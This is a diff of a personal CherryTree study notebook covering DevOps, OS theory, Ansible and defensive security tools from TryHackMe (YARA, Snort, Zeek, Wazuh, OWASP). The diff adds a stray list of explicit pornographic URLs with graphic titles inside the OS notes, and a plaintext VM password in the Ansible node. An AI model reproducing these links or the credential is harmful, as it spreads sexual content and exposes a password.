@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1685939072">
+  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1694987488">
     <node name="Curso de cloud computing" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1619531922" ts_lastsave="1649170170">
       <rich_text># Que es EC2
 - son practicamente maquinas virtuales
@@ -3722,7 +3722,7 @@ IAM Roles
     <node name="Telemetry (Prom &amp; Graf)" unique_id="130" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672430910" ts_lastsave="1672431148">
       <rich_text>collection of business and diagnosis data from the software in prod, and store and visualize it for eht purpose of diagnostic</rich_text>
     </node>
-    <node name="Linux" unique_id="131" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672680784" ts_lastsave="1686616588">
+    <node name="Linux" unique_id="131" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672680784" ts_lastsave="1688748748">
       <rich_text>Linux
 - Operating system, is in middle of your hardware and users
 - linux born in 1991
@@ -4662,7 +4662,7 @@ Management and run levels
       <rich_text weight="heavy">lvdisplay</rich_text>
       <rich_text>, to show all logical volumes
       ⇒ </rich_text>
-      <rich_text weight="heavy">mkfs.xfe {logical volume} </rich_text>
+      <rich_text weight="heavy">mkfs.xfs {logical volume} </rich_text>
       <rich_text>-&gt; /dev/{logical vg}/{logical volume}
       ⇒ mount volume in folder
    → to extends
@@ -5647,7 +5647,7 @@ Subpantillas (patials)
 - se invocan con {{- template “nombre plantilla” }}
 - {{- template “nombre plantilla” . }} se agrega el punto para poder usar los valores a ejecutar, contexto, el unto es un contexto, se pueden poner otros</rich_text>
     </node>
-    <node name="os" unique_id="136" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1676838307" ts_lastsave="1687121650">
+    <node name="os" unique_id="136" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1676838307" ts_lastsave="1699212304">
       <rich_text>Introduction
 - combination of hardware, software and data used to solve problems
 - level of important
@@ -6041,16 +6041,155 @@ Deadlock Handling methods
 - ignorance
 - detection and recovery
 
+Introduction to File systems
+- any data in hard disk is a file
+- files con be various formats
+- no. blocks = HD size / block size
+- the files are diveded in blocks
+- files use complete blocks, if the data is lowest of space is used this space and it is free the space, el espacio es restado y nos quedamos con el restante
+- all OS contains functions to manage files using languages of programming
+- attributes:
+   → name of a file
+   → type of a file
+   → location of a file
+   → size of a file
+   → protection information o a file, read/write/delete
+   → time and date
+- contains logical and phisical address
+
+Understanding File Access using System calls
+- firts is created in ram, system call the application to create files
+- use of create(file) to save file in HDD
+- the file is split in blocks
+- is possible that file is in contigous allocation or not
+- File control block, manage a attributes in ram, does not exists filename, only location, size, access, type
+- open(), this is a system call, return a pointer
+- per process open file table
+- read and write calls, read use a pointer (dir of file)
+- operations:
+   → creating
+   → reading
+   → writing
+   → repositioning
+   → deleting
+   → truncating
+
+File allocation methods
+- Contigous method
+   → simple to implement
+   → time taken to read a file is very less
+   → random access is very access
+   → dis: size declaration problem
+   → dis: external fragmentation problem, empty blocks when delete a files
+   → dis: internal fragmentation problem
+
+Linked list allocation
+- non contiguos
+- every file contains the address of next file block, in the begining or end
+- the last file contain a null
+- advantages:
+   → no size declaration problem
+   → no external fragmentation
+- disadvantages
+   → time to read/write a file is very high
+   → random access takes lot of time
+   → pointers waste few bytes in every block
+   → internal fragmentation
+
+Fat allocation method
+- file allocation table
+   → number of entries in fat = number of disk blocks in hard disk
+- advantages:
+   → no size declaration problem
+   → no external fragmentation problem
+   → random access is easier
+- size of FAT = no. of entries in FAT * Size of a single entry
+   → no. entries FAT = of disk blocks * size of single entry
+   → (m * log_2 m) bits
+
+Indexed allocation Method
+- FAT table to entries of direction of “file”
+- with random access is very fast to access to files
+- use of Inode to index files in linux
+
+Free space managment
+- main responsability of file system is to allocate disk blocks to blocks of files and keep track of these files
+
+Understanding the structure of hard disk
+- exists multiple platters
+- divided in tracks and tracks in blocks, cylinder is a set of tracks in the same space
+- seek time, read/write head move between tracks
+- rotational latency, change between blocks
+- data transfer latency, reading the complete block
+- the algortithm to process requests depending of track moments
+
+Disk Scheduling algorithms
+- FCFS, requests I/O first will be satisfied first by the hd
+   → adv: no starvation of a request
+   → depending of time of execution to scheduling the task
+- total seek time = no. of cylinders movenment * total time of cross 1 cylinder
+- SSTF (shortest seek time first), select the requests that requires the least movement of the disk arm from its current position,regardless of th eposition
+   → adv: starvation problem
+- SCAN algorithm (Elevator algorithm)
+   → works exactly like an elevator
+   → goes in one direction satisfying all the requests and then goes back in the other direction satisfaying the remaining requests
+- C-SCAN, circular-scan
+- LOOK
+   → is like Scan
+   → this avoid the edges if does not necesary
+- C-LOOK, use of C-SCAN + LOOK
+
+Kernel, system calls, modes of execution
+- kernel is function more important and very use to execute the system, device drivers
+- 2 modes, user mode and kernel mode
+- programs execute en user mode
+- kernel mode only execute OS
+
+fork()
+- used by a process to create a copy of itself (same address space except process id)
+- parent and child process
+- the executions of child is before of fork
+- the child can create children if exist before fork or another fork... counter program
+- disv:
+   → context switching overhead
+   → wastage of memory due to the maintainance of multiple copies of the same process
+
+Threads
+- heap segment
+   → only save entries of stack segment
+   → dynamic memory
+- stack segment
+   → adding one funtions
+   → this is created varibales
+   → local variables
+   → remember the order of fn calls
+   → static memory
+- data segment
+- code segment
+- the process by default is single thread
+
+
 
 x</rich_text>
       <rich_text link="webs https://www.xvideos.com/amateur-channels/sweetie_fox_official">/amateur-channels/sweetie_fox_official</rich_text>
       <rich_text>
 /amateur-channels/the2001xperience
-
-msg  db 'Como modelo predictivo', 0x0d, 0x0a, '$'
-msg  db 'No tengo la capacidad de', 0x0d, 0x0a, '$'
-msg  db 'Abrir ningun explorador de internet', 0x0d, 0x0a, '$'
-msg  db 'En que puedo ayudarle?', 0x0d, 0x0a, '$'
+amateur-channels/romulo_pontess
+amateur-channels/ivana_montana
+pornstar-channels/tommy_wood_official
+amateur-channels/allinika
+pornstars/piper-perri-1
+amateur-channels/polysweet
+/models/catherine-count
+</rich_text>
+      <rich_text link="webs https://www.xvideos.com/video36076647/geisha_full_movies_">https://www.xvideos.com/video36076647/geisha_full_movies_</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text link="webs https://www.xvideos.com/channels/big_ass_teens1#_tabVideos">https://www.xvideos.com/channels/big_ass_teens1#_tabVideos</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text link="webs https://www.xvideos.com/video76510781/step_sister_moves_her_thick_ass_seducing_me_to_ride_my_dick">https://www.xvideos.com/video76510781/step_sister_moves_her_thick_ass_seducing_me_to_ride_my_dick</rich_text>
+      <rich_text>
 
 
 --------------------------------------------------------------
@@ -6130,7 +6269,13 @@ BIOS
       ⇒ 16 bit: ax, bx, cx, dx
       ⇒ 32 bit: eax, ebx, ecx, edx
       ⇒ 64 bit: rax, rbx, rcx, rdx, are not available
-      ⇒ </rich_text>
+
+To use image is necesary install </rich_text>
+      <rich_text family="monospace">bochs-x</rich_text>
+      <rich_text> and </rich_text>
+      <rich_text family="monospace">bochs-</rich_text>
+      <rich_text>sdl
+in execution before bochs enter c</rich_text>
     </node>
     <node name="cpu building" unique_id="139" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1679861282" ts_lastsave="1679863408">
       <rich_text>el primer circuito, Active low S-R latch tiene un acceso set y un reset
@@ -6770,8 +6915,52 @@ Anexo A (los controles 4 al 10 son mandatorios para obtener la certifciacion)
     <node name="intro al Backend" unique_id="144" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684292553" ts_lastsave="1684292837">
       <rich_text>IOT puede ser parte de un frontend</rich_text>
     </node>
+    <node name="ansible" unique_id="168" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688524216" ts_lastsave="1692993730">
+      <rich_text>Password maquina virtual: 12345678 o master
+
+plataforma de software libre para configurar y administrar servidores
+instalacion multinodo
+ejecucion de tareas ad hoc y administracion de servidores
+se usa atravez de ssh, necesita python2.4+
+uso de JSON o YAML
+
+inline: ansible -m shell -a ‘cmmand’ -i inventory {servers}
+ansible -m ping -i inventory {servers}
+para ejecutart comandos como root se usa la bandera -b o --become 
+checar los playbook: ansible-playbook -C {playbook} -i {inventory}, para ejecutar se quita la bandera -C
+
+ansible -m setup -i inventory {server}, para obtener un setup del servidor, se usa generalmente para saber que tipo de os es</rich_text>
+    </node>
+    <node name="docker-security" unique_id="169" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688584989" ts_lastsave="1688587132">
+      <rich_text>tools:
+	AQUA, Prisma Cloud, Snyk, commercial tools
+	free or open source: snyk community edition, trivy
+	GIT secrets, security plugins in any IDE, trufflehog
+		sonarqube - quality code
+		sast - fortify, veracode, checkmarx
+		sca - fortify, veracode, blackduck, snyk
+		dast - owasp zap, webinspect, veracode, dast, acunetix
+		iac - bridfecrew, synk
+		containers - aqua, qualys, prismacloud
+	pipeline tools, jenkins, aws, github actions, gitlab
+	cloud security posture management tools - aqua, bridgecrew
+	container registry scanning tools - aqua, aws native registry scanning
+	infrastructure scanning tools - chef inspect, nessus
+	cloud security tools - aws security hub, azure defender
+	
+	
+basic terms
+- SAST, static application security testing, whitebox
+- SCA, software composition analysis
+- DAST, dynamic application security testing, black-box security testing
+- IAST, interactive application security testing, inlcude sast and dast
+- IAC, infrastructure as code
+- API security, process to identify security issues in API
+- shift left approach is devsecops</rich_text>
+    </node>
+    <node name="Servidores web" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694987488" ts_lastsave="1694987488"/>
   </node>
-  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1687458672">
+  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1698636581">
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
       <rich_text>6 levels:
 - Hash Values (Trivial)
@@ -7202,7 +7391,7 @@ CTI Standards &amp; Frameworks
    → language developed for the: specification, capture, characterisation and communication of standardised CTI
 - Cyber kill chain</rich_text>
     </node>
-    <node name="Threat Intelligence Tools" unique_id="161" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687458672" ts_lastsave="1687462159">
+    <node name="Threat Intelligence Tools" unique_id="161" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687458672" ts_lastsave="1687633710">
       <rich_text>Threat Intelligence
 - analysis of data and information using tools and techniques
 - generate meaning patterns
@@ -7236,7 +7425,402 @@ Abuse.ch
    → feodo tracker, used to track botnet commands and control, infrastructure linked with emotet, dridex and trickbot
    → ssl blacklist, collecting and providing a blocklist of malicious SSL certificates and JA3/JA3s fingerprints
    → url haus, sharing malware distribution sites
-   → threat fox, sharing indicatos of comprimise</rich_text>
+   → threat fox, sharing indicatos of comprimise
+
+PhishTool
+- main of precursors of any cyber attack
+- opening and accessing malicious files and links sent to them by email
+- victims' infected with malware, harvesting their credentials and personal data
+- objective is financial fraud
+- two versions:
+   → Community
+   → Enterprise
+- core functions:
+   → Perform email analysis
+      ⇒ retrieves metadata from phising emails
+      ⇒ explanations and capabilities to follow the email's actions, attachments and URLs to triage the situation
+   → Heuristic intelligence
+      ⇒ OSINT in baked into the tool to provide analysts with the intelligence needed to stay ahead of persistent attacks and understand what TTPs were used to evade security controls and allow the adversary to social engineer a target
+   → Classification and reporting
+      ⇒ to take action quickly
+      ⇒ reports can be generated to provide a forensic record that can be shared
+- in enterprise version
+   → manage user-reported phising events
+   → report phising email findings back to users and keep them engaged in the process
+   → email stack integration with microsoft 365 and google workspace
+- in analysis tab
+   → Headers: routing information email, source and destination, IP, DNS, Timestamp
+   → Received Lines: track of SMTP servers for tracing purposes
+   → X-headers: extension of headers, additional information
+   → Security: Detail on emial, Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM) and Domain-based Message Authentication, Reporting and Conformance (DMARC)
+   → Attachnments: files found in the email
+   → Message URLs: Associated external URLs found in the email
+
+Cisco Talos Intelligence
+- this is a large team of security practicioners
+- provide actionable intelligence, visibility on indicators and proteccion agains emerging threats
+- six key teams:
+   → Threat intelligence &amp; interdiction: quick correlation and tracking of threats
+   → Detection Research: vulnerability and malware analysis, create rules and content
+   → Engineering &amp; Development: provides the maintenance support
+   → vulnerability research &amp; discovery: working with service and software vendors to develop repeatable means of identifying and reporting security vulnerabilities
+   → Communities: maintains the image of the team and the open-source solutions
+   → global outreach: disseminates intelligence to costumers and the security community through publications</rich_text>
+    </node>
+    <node name="Yara" unique_id="162" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687637289" ts_lastsave="1687749304">
+      <rich_text>Yet Another Ridiculous Acronym
+
+What is
+- the pattern matching swiss knife form malware researchers
+- use of rules to label patterns
+- strings is fundamental to search the patterns
+
+Yara rules
+- use rules
+- only effectives when understarnding of the patterns to search
+- requires two arguments
+   → the rule file
+   → name of of file, directory or process ID to use the rule for
+- every rule must have a name and condition
+- .yar is standard file extension
+- conditions in yara:
+   → Desc
+      ⇒ short of description
+   → Meta
+      ⇒ reserved for descriptive information
+      ⇒ does not influence the rule itself
+   → Strings
+      ⇒ use of strings to search for specific text or hexadecimal in files or programs
+      ⇒ the variables defined as $VAR
+      ⇒ is necessary add condition to search
+      ⇒ with multiple values use in condition: any of them
+   → Conditions
+      ⇒ in this is possible use relational operators to match or use any of then to use all or true to check if file exists
+   → Weight
+
+Yara Modules
+- Cuckoo sandbox or python's PE module allow improve the technicality of yara rules
+- Cuckoo is an automated malware analysis environment
+- Python PE: allow crete Yara rules from the various sections and elements of the windows portable executable structure
+
+Other tools and Yara
+- exists multiple github resoureces and open-source tools to be utilized
+- LOKI
+   → free open-source IOS (Indicator of Compromise)
+   → based in 4 methods:
+      ⇒ File name ioc check
+      ⇒ yara rule check
+      ⇒ hash check
+      ⇒ c2 back connect check
+   → is possible use in win and linux
+- THOR
+   → multi-platform IOC and YARA scanner
+   → exists precompiled versions for windows, linux and macos
+- FENRIR
+   → is a bash script; it will run on any system capable of running bash
+- YAYA (Yet another Yara Automation)
+   → is a new open source tool to help researchers manage multiple YARA rule repositories. YAYA starts by importing a set of high-quality YARA rules and then lets reserchers add their own rules, disable specific rulesets, and run scans of files
+
+Using loki and its Yara rule set
+- Loki contains some rules created to use
+- Is possible add own rules based in my forensics reports
+
+Creating Yara rules with yarGen
+- used to create own rules
+- this is a generator for YARA rules
+
+Valhalla
+- online yara feed created and hosted</rich_text>
+    </node>
+    <node name="OpenCTI" unique_id="163" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687811604" ts_lastsave="1687999015">
+      <rich_text>open-source threat intelligence platform
+
+Data model
+- uses a variety of knowledge schemas in structuring data
+- STIX us a serialised and standardised language format
+- implemented as entities and relationships
+- highlight services:
+   → GraphQL API: to connect clients to the database and the messaging system
+   → Write workers: write queries asynchronously from RabbitMQ, use python
+   → Connectors: set of Python processes used to ingest, enrich or export data on the platform
+</rich_text>
+    </node>
+    <node name="MISP" unique_id="165" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687886078" ts_lastsave="1687886640">
+      <rich_text>Malware Information Sharing Platform
+
+What is?
+- an open source threat information platform that facilities the collection, storage and distribution of threat IOCs
+- distributed model, with supported closed, semi-private and open communities
+- uses:
+   → Malware reverse engineering
+   → security investigations
+   → intelligence analysis
+   → law enforcement
+   → risk analysis
+   → fraud analysis
+- support:
+   → IOC database, technical and non-technical information
+   → automatic correlation
+   → data sharing
+   → import and export features
+   → event graph
+   → API support
+- common terms:
+   → event
+   → attributes
+   → objects
+   → object references
+   → sightings
+   → tags
+   → taxonomies
+   → galaxies
+   → indicators</rich_text>
+    </node>
+    <node name="Traffic Analysis Essencials" unique_id="166" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688053049" ts_lastsave="1688063745">
+      <rich_text>Network security and Network Data
+- use of authentication and authorisation
+- three base control levels:
+   → physical, prevent unauthorised physical access to networking devices
+   → technical, data security controls, use of tunnels and security layers
+   → administrative, creation of policies, access level and authentication processes
+- access control, controls to ensure authenticacion and authorisation
+- threat control, detecting and preventing anomalous/malicious activities
+- managed security services:
+   → Network penetration testing, simulation of external and internal attacker
+   → vulnerability assesment, discovering and analysing vulnerabilities in the environment
+   → incident response, set of actions to identify, contain and eliminate incidents
+   → behavioural analysis, use of specific patterns to detect anomalies, threats, vulnerabilities and attacks
+
+Traffic Analysis
+- method to intercepting, recording/monitoring and analysing network data and communication
+- detect and response to system health issues, network anomalies and threats
+- use of two techniques:
+   → flow analysis, collect data from networking devices, easy but not inlcude root of cause of a case
+   → packet analysis, collect all available network data, provide full packet details, requires time and skillset to analyse</rich_text>
+    </node>
+    <node name="Snort" unique_id="167" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688145986" ts_lastsave="1690330125">
+      <rich_text>Open source, rule-based network intrusion detection and prevention system (NIDS/NIPS)
+
+Introduction to IDS/IPS
+- Intrusion detection system
+   → passive monitoring
+   → two types of IDS:
+      ⇒ Network intrusion detection system, monitors the traffic flow from various areas of network, investigate the traffic on the entire subnet
+      ⇒ Host-based intrusion detection system, monitors the traffic flow from a single endpoint
+- Intrusion prevention system
+   → active protecting solution
+   → responsible for stopping/preventing/terminating the suspicous event
+   → exists 4 main types of IPS systems:
+      ⇒ Network intrusion prevention system, monitors the traffic flow from various areas of the network
+      ⇒ Behavious-based intrusion prevention system, monitor the traffic flow from various areas of the network, this required time of training ("baselining")
+      ⇒ wireless intrusion prevention system, monitors the traffic from of wireless network
+      ⇒ host-based intrusion prevention system, wireless from a single endpoint
+- Techniques:
+   → signature-based, relies on rules that identify the specific patterns, use to known threats
+   → behaviour-based, new threats and new patterns, models compare the known/normal with unknown/abnormal behaviours
+   → Policy-based, detected activities with system configuration and security policies
+- snort has three primary uses: as a packet sniffer like tcpdump, packet logger - for network traffic debugging, full-blown network intrusion prevention system.
+- snort is a NIDS and NIPS
+- capabilities:
+   → live traffic analysis
+   → attack and probe detection
+   → packet logging
+   → protocol analysis
+   → real-time alerting
+   → modules &amp; plugins
+   → pre-processors
+   → cross-platform support
+
+Use snort
+- sudo snort -c /etc/snort/snort.conf -T -&gt; testing configuration
+- snort -V -&gt; show version
+- rules:
+   → action: Alert | Drop | Reject | Log
+   → Protocol: TCP | UDP | ICMP
+   → Source IP
+   → Source Port
+   → Direction: &lt;&gt; | -&gt;
+   → Destination IP
+   → Destination Port
+   → Options: (msg;flags;References;Sid;Rev)
+- possible filter using flags:
+   → F - FIN
+   → S - SYN
+   → R - RST
+   → P - PSH
+   → A - ACK
+   → U - URG
+- or using dsize: dsize:min&lt;&gt;max
+- using in references the sameip is to check if is same ip source and destination
+
+####
+Challenge
+- commands:
+   → snort -c local.rules -A full -l . -r mx-3.pcap
+   → snort -r {logfile}
+   → snort -r {logfile} -n {port}
+   → snort -r {logfile} -X -n {port} | to show more information, get name of FTP
+   → in rules use of content: “{string to search}” to search strings
+   → mode sniffer: sudo snort -v -l . &amp;&amp; sudo snort -r {logs} -X</rich_text>
+    </node>
+    <node name="network minner" unique_id="170" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690415989" ts_lastsave="1690416445">
+      <rich_text>Open source traffic snipper, pcap handler and protocol analyzer
+Network Forensic Analysis Tool for windows
+is used as a passive network sniffer/packet capturing tool to detect OS, sessions, hostnames, open ports, without putting any traffic on the network
+release 2007
+answer the 5W:
+- who (source IP and port)
+- what (data/payload)
+- where (destination IP and port)
+- when (time and data)
+- why (how/what happend)</rich_text>
+    </node>
+    <node name="Endpoint Security" unique_id="177" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695053526" ts_lastsave="1695056259">
+      <rich_text>Topics:
+- endpoint security fundamentals
+- endpoint logging and monitoring
+- endpoint log analysis
+
+Security fundamentals:
+- Core windows process, is necesary learn how to works windows
+- knowledges about core windows processes
+- manage of task manager
+- sysinternals, is a compilation of over 70+ tools
+- the most important is: TCPView and process explorer
+- TCPView, this shows detailed listing all TCP and UDP endpoints in the system
+- Process Explorer, shows a list of the currently active processes, including names and owner
+
+Logging and monitoring
+- windows event logs, are not a text files that can viewed using a text editor
+- three ways:
+   → Event viewer, GUI
+   → Wevutil.exe, command line
+   → Get-WinEvent, PowerShell cmdlet
+- sysmon, used to monitor and log events on windows, detail and granular control
+- OSQuery, open-source tool, query using SQL syntax, can be installed on various platforms: win, linux, macos and freebsd
+- only used inside of machine
+- Wazuh, open source and extensible EDR solution
+
+Log analisys
+- Event correlation, relationship from multiple logs sources
+- Baselining, </rich_text>
+    </node>
+    <node name="Sysinternals" unique_id="178" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695442603" ts_lastsave="1695442661">
+      <rich_text>compilation of over 70+ windows based tools
+adquired in 2006</rich_text>
+    </node>
+    <node name="Windows Event Logs" unique_id="179" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695536698" ts_lastsave="1696121811">
+      <rich_text>tools to audit trail
+used to sysadmins, IT technicians, desktop engineers, etc.
+
+Event Viewer
+- possible see using tex editor
+- raw data is possible translate to XML
+- elements:
+   → system logs, associeated with OS segments, information of devices
+   → security logs, logon and logoff activities on a device
+   → application logs, related to applications installed on a system, error, events and warnings
+   → Directory service events, used with active directory, domain controllers
+   → File Replication Service Events, associated with windows servers
+   → DNS Event logs, record domain events
+   → Custom logs, custom data storage
+- ways:
+   → Event viewer, GUI
+   → Wevutil.exe, cli tool
+   → Get-WinEvent, powershell cmdlet</rich_text>
+    </node>
+    <node name="Sysmon" unique_id="180" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303227" ts_lastsave="1696378007">
+      <rich_text>tool to monitor and log events on win
+detailed information about process creation, network connection and changes to file creation time</rich_text>
+    </node>
+    <node name="Osquery" unique_id="183" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696816774" ts_lastsave="1696817220">
+      <rich_text>open-source agent created by facebook in 2014
+convert os in relational database
+is like sqlite</rich_text>
+    </node>
+    <node name="Wazuh" unique_id="184" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696906198" ts_lastsave="1699681330">
+      <rich_text>is a EDR (endpoint detection and response), series of tools and applications that monitor devices for an activity
+fetures:
+- auditing a device for common vulnerabilities
+- Proactively monitoring a device for suspicious activity such as unautorised login, brute force attascks or privileges escalations
+- visualing complex data and events into neat and trendy graphs
+- recording a device's normal operating behaviour to help with detecting anomalies
+
+created in 2015 is an open-source
+device called agent
+
+Wazuh agents
+devices that record the events and preocesses of a system are called agents
+monitor the processes and events
+needs:
+	operating system
+	address of the wazuh server to send logs
+	which group is added agent</rich_text>
+    </node>
+    <node name="Zeek" unique_id="174" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693767420" ts_lastsave="1693850742">
+      <rich_text>open source and commercial network monitoring tool
+passive
+used to network security monitor
+
+Network monitoring and Zeek
+- set of management actions to watch/continuosly overview and optionally save the network traffic
+- network security is focused on network anomalies like rogue hosts, encrypted traffic, suspicous service and port usage, and malicious/suspicious traffic patterns
+- zeek provides a wide range of detailed logs ready to investigate both for forensics and data analysis actions
+
+Zeek logs
+- 50+ logs in 7 categories
+- use cat {file} | zeek-cut {fields}
+
+CLI Kung fu recall
+-- use of CLI commands in linux
+
+Zeek signatures
+- signatures to have rules and event correlations
+- low-level pattern matching and cover conditions similar to snort rules
+- exists a scriptng language to find events
+- is composed of:
+   → id
+   → conditions
+   → actions
+
+Zeek Script
+- own event-driven scripting language, high-level languahes and allows us to investigate and correlate the detected events</rich_text>
+    </node>
+    <node name="BRIM" unique_id="175" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694048638" ts_lastsave="1694048863">
+      <rich_text>open source desktop application
+search and analytics
+support zeek signatures and suricata rules
+Two types of inputs:
+	Packet Capture FIles: pcap files with tcpdump, tshark and wireshark
+	Log Files: strucutred log files like zeek logs</rich_text>
+    </node>
+    <node name="TheHive" unique_id="164" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687811761" ts_lastsave="1687814468">
+      <rich_text>Security Incident Response Platform
+
+Introdution
+- scalable, open-source and freely available security incident response platform
+- assist security analysts and practitioners working in SOCs, CSIRTs and CERTs
+- core functions:
+   → Collaborate, multiple analyst from one organisation can work together, real time
+   → Elaborate, Investigations correspond to cases, broken down into associated tasks, created from scratch or using a template
+   → Act, quick traiging process can be supported by allowing analyst to add observables to their case
+
+Features and Integrations
+- support analyst workflows, faetures
+   → Case/task Management, Every investigation is meant to correspond to a case that has been created, broken down into one or more tasks for added granularity
+   → Alert triage, Cases can be imported from SIEM alerts, email reports and other security event sources
+   → Observable Enrichment with cortex, supports cortex, an observable analysis and active response engine.
+   → Active response, allos analystys to use responders and run active actions to communicate, share information about incidents and prevent or contain a threat
+   → Custom dashboard, Statistics on cases, tasks, observables, metrics and more can be compiled and distributed on dashboards
+   → Built-in MISP Integration, useful integration is with MISP, platform for sharing, storing and correlating indicators of compromise of targeted attacks and other threats
+
+User profiles and permissions
+- create an organisation group to identfy the analysts and assign different roles based on a list of pre-configured user profiles
+- preconfigured user profiles:
+   → admin, full administrative permissions on the platform; limited to cases or investigations
+   → org-admin, manage users and all organisation-level configuration, can create and edit cases, tasks, observables and run analysers and responders
+   → analyst, can create and edit cases, tasks, observables and run analysers and reponders
+   → read-only, can only read, cases, tasks and observables details</rich_text>
     </node>
     <node name="Vulnversity" unique_id="153" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686027971" ts_lastsave="1686028576">
       <rich_text>Use of nmap to scan machine:
@@ -7434,6 +8018,229 @@ Defenses:
    → official images
    → images with verified publisher tag
    → docker certified images</rich_text>
+    </node>
+    <node name="OWASP 10" unique_id="171" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691629270" ts_lastsave="1693269735">
+      <rich_text>Broken access control
+- access to page without authorization
+- view sensitive information from other users
+- accesing unauthorized functionality
+
+IDOR
+- Insecure direct object reference
+- accesing using id or another identifier
+
+Cryptographic failures
+- misuse or lack of use of cryp algo for protecting sensitive information
+- use of encrypting data in transit, connect between user and pages
+- encrypting data at rest, save data in server using cyphers
+- common use of the techniques like man in he middle attacks
+- does not necesary adavenced networking knowledge
+
+Injection
+- interpreted user-controlled input as commands or parameters
+- depending of technology and how these technologies interpret the input
+- SQL injection: use of sql queries in input, use to get, modify and delete information
+- command Injection: use of system commands
+- how to avoid:
+   → using an allow list: input is compared to a list of safe inputs or characters, launch errors if is not secure
+   → stripping input: contains dangerous characters, these are removed
+
+Insecure Desing
+- vulnerabilities which are inherent to the application's architecture
+- bad implementations or configurations
+- shortcuts by developers
+- insecure password resets
+   → use of brute force with code for validation
+
+Security Misconfiguration
+- distint of top 10
+- poor configuration on cloud services
